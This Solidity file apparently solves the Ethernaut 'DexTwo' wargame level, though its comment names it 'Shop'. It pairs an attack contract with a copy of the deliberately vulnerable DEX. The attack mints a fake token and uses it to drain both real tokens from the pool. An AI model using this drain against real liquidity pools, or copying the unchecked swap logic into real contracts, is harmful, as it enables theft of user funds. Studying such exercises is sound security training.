// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";

/* Used to solve level 23 (Shop) in Ethernaut. 
 * Easy level. I'm glad that we're using the conventional ERC20 contracts so that players get a
 * better taste of what actual contracts may cover. 
 * I solved 22 by just using the interface, but this one required a token of your own, so I did
 * all of it in the smart contract. Just call attack after constructing.
*/
contract DexTwoAttack is ERC20 {

    DexTwo dex;
    constructor(DexTwo _dex) ERC20("Get", "Bodied") public {
        _mint(address(this), 1 ether);
        dex = _dex;
    }

    function attack() public {
        _approve(address(this), address(dex), 1 ether);

        // Attack using this token
        _mint(address(dex), 1);
        dex.swap(address(this), dex.token1(), balanceOf(address(dex)));
        dex.swap(address(this), dex.token2(), balanceOf(address(dex)));

        // Send token to sender
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());
        token1.transfer(msg.sender, token1.balanceOf(address(this)));
        token2.transfer(msg.sender, token2.balanceOf(address(this)));
    }
}

contract DexTwo  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_amount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_amount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(spender, amount);
    SwappableTokenTwo(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}